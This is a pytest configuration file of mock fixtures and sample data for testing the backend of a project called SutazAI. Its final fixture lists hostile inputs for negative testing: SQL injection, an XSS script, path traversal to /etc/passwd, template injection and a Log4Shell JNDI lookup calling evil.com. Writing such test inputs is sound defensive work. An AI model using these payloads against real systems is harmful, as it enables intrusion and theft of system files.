"""
Test configuration and fixtures for SutazAI backend testing
Professional-grade test infrastructure with comprehensive fixtures
"""

import asyncio
import os
import pytest
import logging
from typing import AsyncGenerator, Dict, Any
from unittest.mock import AsyncMock, MagicMock, patch
from fastapi.testclient import TestClient
from httpx import AsyncClient
import tempfile
import json

# Set test environment variables before importing app
os.environ.update({
    "SUTAZAI_ENV": "test",
    "JWT_SECRET_KEY": "test_secret_key_for_testing_minimum_32_chars",
    "DATABASE_URL": "postgresql://test:test@localhost:5432/sutazai_test",
    "REDIS_URL": "redis://localhost:6379/15",
    "OLLAMA_HOST": "http://localhost:11434",
    "DISABLE_AUTH": "false"
})

# Configure logging for tests
logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)


@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
async def mock_cache_service():
    """Mock cache service for testing"""
    cache_mock = AsyncMock()
    cache_mock.get.return_value = None
    cache_mock.set.return_value = True
    cache_mock.delete.return_value = True
    cache_mock.clear_all.return_value = True
    cache_mock.get_stats.return_value = {
        "hits": 100,
        "misses": 20,
        "hit_rate": 0.83,
        "total_operations": 120
    }
    return cache_mock


@pytest.fixture
async def mock_pool_manager():
    """Mock connection pool manager for testing"""
    pool_mock = AsyncMock()
    pool_mock.get_stats.return_value = {
        "active_connections": 5,
        "total_connections": 10,
        "pool_utilization": 0.5
    }
    pool_mock.close.return_value = None
    return pool_mock


@pytest.fixture
async def mock_ollama_service():
    """Mock Ollama service for testing"""
    ollama_mock = AsyncMock()
    ollama_mock.generate.return_value = {
        "response": "Test response from Ollama",
        "cached": False,
        "model": "tinyllama",
        "tokens": 15
    }
    ollama_mock.generate_streaming.return_value = asyncio.iterate([
        "Test", " streaming", " response"
    ])
    ollama_mock.batch_generate.return_value = [
        {"response": "Response 1", "cached": False},
        {"response": "Response 2", "cached": False}
    ]
    ollama_mock.get_stats.return_value = {
        "requests_processed": 50,
        "average_response_time": 150,
        "cache_hit_rate": 0.3
    }
    ollama_mock.warmup.return_value = None
    ollama_mock.shutdown.return_value = None
    return ollama_mock


@pytest.fixture
async def mock_task_queue():
    """Mock task queue for testing"""
    queue_mock = AsyncMock()
    queue_mock.get_task_status.return_value = {
        "status": "completed",
        "result": {"message": "Task completed successfully"}
    }
    queue_mock.get_stats.return_value = {
        "pending_tasks": 0,
        "completed_tasks": 25,
        "failed_tasks": 1
    }
    queue_mock.register_handler.return_value = None
    queue_mock.stop.return_value = None
    return queue_mock


@pytest.fixture
async def mock_health_monitoring():
    """Mock health monitoring service for testing"""
    health_mock = AsyncMock()
    health_mock.get_detailed_health.return_value = MagicMock(
        overall_status=MagicMock(value="healthy"),
        timestamp=MagicMock(),
        services={
            "redis": MagicMock(
                status=MagicMock(value="healthy"),
                response_time_ms=15,
                last_check=None,
                last_success=None,
                last_failure=None,
                error_message=None,
                consecutive_failures=0,
                circuit_breaker_state="closed",
                circuit_breaker_failures=0,
                uptime_percentage=99.9,
                custom_metrics={}
            )
        },
        performance_metrics={"response_time": 50},
        system_resources={"cpu_percent": 25.0},
        alerts=[],
        recommendations=[]
    )
    health_mock.get_prometheus_metrics.return_value = "# Prometheus metrics test data"
    return health_mock


@pytest.fixture
async def mock_circuit_breaker_manager():
    """Mock circuit breaker manager for testing"""
    breaker_mock = AsyncMock()
    breaker_mock.get_all_stats.return_value = {
        "redis": {
            "state": "closed",
            "failure_count": 0,
            "last_failure_time": None
        },
        "database": {
            "state": "closed", 
            "failure_count": 0,
            "last_failure_time": None
        }
    }
    breaker_mock.reset_all.return_value = None
    return breaker_mock


@pytest.fixture
async def app_with_mocks(
    mock_cache_service,
    mock_pool_manager,
    mock_ollama_service,
    mock_task_queue,
    mock_health_monitoring,
    mock_circuit_breaker_manager
):
    """Create FastAPI app with all dependencies mocked"""
    
    with patch.multiple(
        'app.core.cache',
        get_cache_service=AsyncMock(return_value=mock_cache_service),
        _cache_service=mock_cache_service
    ), patch.multiple(
        'app.core.connection_pool',
        get_pool_manager=AsyncMock(return_value=mock_pool_manager),
        get_http_client=AsyncMock()
    ), patch.multiple(
        'app.services.consolidated_ollama_service',
        get_ollama_service=AsyncMock(return_value=mock_ollama_service)
    ), patch.multiple(
        'app.core.task_queue',
        get_task_queue=AsyncMock(return_value=mock_task_queue),
        create_background_task=AsyncMock(return_value="test-task-id")
    ), patch.multiple(
        'app.core.health_monitoring',
        get_health_monitoring_service=AsyncMock(return_value=mock_health_monitoring)
    ), patch.multiple(
        'app.core.circuit_breaker_integration',
        get_circuit_breaker_manager=AsyncMock(return_value=mock_circuit_breaker_manager),
        get_redis_circuit_breaker=AsyncMock(),
        get_database_circuit_breaker=AsyncMock(),
        get_ollama_circuit_breaker=AsyncMock()
    ), patch('app.auth.router.router'), patch('app.api.text_analysis_endpoint.router'), \
       patch('app.api.vector_db.router'), patch('app.api.v1.endpoints.hardware.router'):
        
        # Import after patching to ensure mocks are in place
        from app.main import app
        yield app


@pytest.fixture
async def async_client(app_with_mocks) -> AsyncGenerator[AsyncClient, None]:
    """Create async client for testing"""
    async with AsyncClient(app=app_with_mocks, base_url="http://test") as client:
        yield client


@pytest.fixture
def sync_client(app_with_mocks) -> TestClient:
    """Create sync client for testing"""
    return TestClient(app_with_mocks)


@pytest.fixture
def sample_chat_request():
    """Sample chat request data"""
    return {
        "message": "Hello, how are you?",
        "model": "tinyllama",
        "use_cache": True
    }


@pytest.fixture
def sample_task_request():
    """Sample task request data"""
    return {
        "task_type": "automation",
        "payload": {"action": "test_action", "data": "test_data"},
        "priority": 1
    }


@pytest.fixture
def sample_agent_config():
    """Sample agent configuration"""
    return {
        "name": "Test Agent",
        "url": "http://test-agent:8080",
        "capabilities": ["test", "automation"],
        "health_cache_ttl": 30
    }


@pytest.fixture
def temp_file():
    """Create temporary file for testing"""
    with tempfile.NamedTemporaryFile(mode='w+', delete=False) as f:
        f.write('{"test": "data"}')
        f.flush()
        yield f.name
    os.unlink(f.name)


@pytest.fixture
def mock_psutil():
    """Mock psutil for system metrics testing"""
    with patch('psutil.cpu_percent', return_value=25.5), \
         patch('psutil.virtual_memory') as mock_memory, \
         patch('psutil.disk_usage') as mock_disk, \
         patch('psutil.net_io_counters') as mock_net:
        
        mock_memory.return_value = MagicMock(
            percent=65.2,
            available=4294967296,  # 4GB
            used=2147483648        # 2GB
        )
        mock_disk.return_value = MagicMock(percent=45.8)
        mock_net.return_value = MagicMock(
            bytes_sent=1048576,    # 1MB
            bytes_recv=2097152     # 2MB
        )
        yield


@pytest.fixture
def mock_validation():
    """Mock validation utilities"""
    with patch.multiple(
        'app.utils.validation',
        validate_model_name=MagicMock(return_value="tinyllama"),
        validate_agent_id=MagicMock(side_effect=lambda x: x),
        validate_task_id=MagicMock(side_effect=lambda x: x),
        validate_cache_pattern=MagicMock(side_effect=lambda x: x),
        sanitize_user_input=MagicMock(side_effect=lambda x, max_length=None: x)
    ):
        yield


@pytest.fixture
def mock_jwt_auth():
    """Mock JWT authentication for testing"""
    with patch('app.auth.router.get_current_user') as mock_user:
        mock_user.return_value = {
            "id": "test-user-id",
            "username": "testuser",
            "email": "test@example.com"
        }
        yield mock_user


@pytest.fixture(autouse=True)
async def cleanup_after_test():
    """Cleanup fixture that runs after each test"""
    yield
    # Cleanup any test artifacts
    asyncio.get_event_loop().set_debug(False)


# Pytest collection hooks for better test organization
def pytest_collection_modifyitems(config, items):
    """Automatically mark tests based on file location"""
    for item in items:
        # Mark tests based on file path
        if "unit" in str(item.fspath):
            item.add_marker(pytest.mark.unit)
        elif "integration" in str(item.fspath):
            item.add_marker(pytest.mark.integration)
        elif "api" in str(item.fspath):
            item.add_marker(pytest.mark.api)
        elif "performance" in str(item.fspath):
            item.add_marker(pytest.mark.performance)
        
        # Mark slow tests
        if hasattr(item, 'function') and getattr(item.function, '__name__', '').startswith('test_slow'):
            item.add_marker(pytest.mark.slow)


# Test data fixtures
@pytest.fixture
def valid_test_data():
    """Valid test data for various scenarios"""
    return {
        "user": {
            "id": "test-user-123",
            "username": "testuser",
            "email": "test@example.com"
        },
        "agent": {
            "id": "test-agent",
            "name": "Test Agent",
            "status": "healthy",
            "capabilities": ["test", "automation"]
        },
        "task": {
            "id": "test-task-456",
            "type": "automation",
            "status": "completed",
            "result": {"message": "Success"}
        }
    }


@pytest.fixture
def invalid_test_data():
    """Invalid test data for negative testing"""
    return {
        "malicious_inputs": [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/}"
        ],
        "oversized_inputs": {
            "long_string": "x" * 10000,
            "large_list": ["item"] * 1000
        }
    }